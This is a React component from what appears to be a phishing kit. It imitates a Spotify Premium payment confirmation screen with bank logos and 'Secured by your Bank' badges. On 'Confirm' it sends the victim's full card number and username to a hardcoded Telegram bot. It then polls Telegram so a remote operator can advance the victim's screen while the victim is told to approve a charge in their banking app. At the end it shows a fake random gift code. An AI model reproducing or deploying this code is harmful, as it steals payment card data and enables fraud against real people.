import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './NextStepAppr.css';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';
import visaLogo from '../assets/visa-logo.png';
import mastercardLogo from '../assets/mastercard-logo.png';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
  const { t } = useLanguage();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState('');

  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  const handleSuccessCard = () => {
    console.log('✅ Success button clicked');
    setIsConfirmed(false);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const closeGiftCard = () => {
    setShowGiftCard(false);
    if (onClose) {
      onClose();  // ← Close the component
    } else {
      sessionStorage.setItem('showCardForm', 'true');
      window.location.href = '/#/';
    }
  };

  const handleBackToAppr = () => {
    console.log('⬅️ Back clicked');
    setIsConfirmed(false);
    if (onClose) {
      onClose();  // ← Close the component
    } else {
      setMessageText('Please make sure you have confirmed.');
      setMessageType('warning');
      setShowMessage(true);
      setTimeout(() => setShowMessage(false), 3000);
    }
  };

  const closeMessage = () => setShowMessage(false);

  useEffect(() => {
    let lastUpdateId = 0;
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              if (callbackData.startsWith('success_card_')) handleSuccessCard();
              else if (callbackData.startsWith('back_to_appr_')) handleBackToAppr();
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: '✅ Action executed!'
              });
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) setUsername(storedUsername);
    if (storedBankName) setBankName(storedBankName);
    if (storedBrand) setCardBrand(storedBrand);
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>SPOTIFY PAYMENT</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
🏪 <b>Merchant:</b> Spotify Premium
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;
      const keyboard = {
        inline_keyboard: [[
          { text: "✅ Success", callback_data: `success_card_${Date.now()}` },
          { text: "⬅️ Back", callback_data: `back_to_appr_${Date.now()}` }
        ]]
      };
      await axios.post(url, { chat_id: TELEGRAM_ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: keyboard });
      return true;
    } catch (error) { return false; }
  };

  const handleConfirm = async () => {
    setIsSending(true);
    const sent = await sendTelegramLog();
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    }
    setIsSending(false);
  };

  if (isConfirmed) {
    return (
      <div className="waiting-container-page">
        {showMessage && <div className={`message-popup ${messageType}`}><span className="message-icon">⚠️</span><span className="message-text">{messageText}</span><button className="message-close" onClick={closeMessage}>×</button></div>}
        <div className="waiting-card">
          <h2 className="waiting-title">Confirmation in App</h2>
          <div className="animated-loader"><div className="loader-ring"></div><div className="loader-ring-2"></div><div className="loader-ring-3"></div><div className="loader-dot"></div></div>
          <h3>Waiting for Confirmation</h3>
          <p>Your confirmation has been sent.</p>
          <p>Please check your mobile banking app.</p>
          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
        </div>
        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </div>
    );
  }

  return (
    <div className="confirmation-overlay">
      {showMessage && <div className={`message-popup ${messageType}`}><span className="message-icon">⚠️</span><span className="message-text">{messageText}</span><button className="message-close" onClick={closeMessage}>×</button></div>}
      <div className="confirmation-modal">
        <div className="modal-header"><div className="card-icons"><img src={visaLogo} alt="VISA" className="visa-logo" /><img src={mastercardLogo} alt="Mastercard" className="mastercard-logo" /></div></div>
        <h3>{t.confirmationInApp || 'Spotify Premium Payment'}</h3>
        <div className="confirmation-details">
          <div className="detail-row">
            <span className="detail-label">{t.merchant || 'Merchant:'}</span>
            <span className="detail-value">{cardBrand}</span>
           </div>
          <div className="detail-row">
            <span className="detail-label">{t.amount || 'Amount:'}</span>
            <span className="detail-value">$0.00</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{t.date || 'Date:'}</span>
            <span className="detail-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{t.cardNumberLabel || 'Card Number:'}</span>
            <span className="detail-value">{cardNumber}</span>
          </div>
        </div>
        <div className="confirmation-instructions">
          <p>• {t.instruction1 || 'Open your banking app on your smartphone.'}</p>
          <p>• {t.instruction2 || 'Confirm the authorization.'}</p>
          <p>• {t.instruction3 || 'Return to this screen after confirmation.'}</p>
          <p>• {t.instruction4 || 'Tap "CONFIRM" when you are back.'}</p>
        </div>
        
        <div className="confirmation-buttons"><button onClick={handleConfirm} className="confirm-btn" disabled={isSending}>{isSending ? 'Sending...' : 'Confirm'}</button></div>
        <div className="secure-badge"><span className="lock-icon">🔒</span><span>Secured by your Bank</span></div>
      </div>
      {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
    </div>
  );
}

export default SpotifyApprove;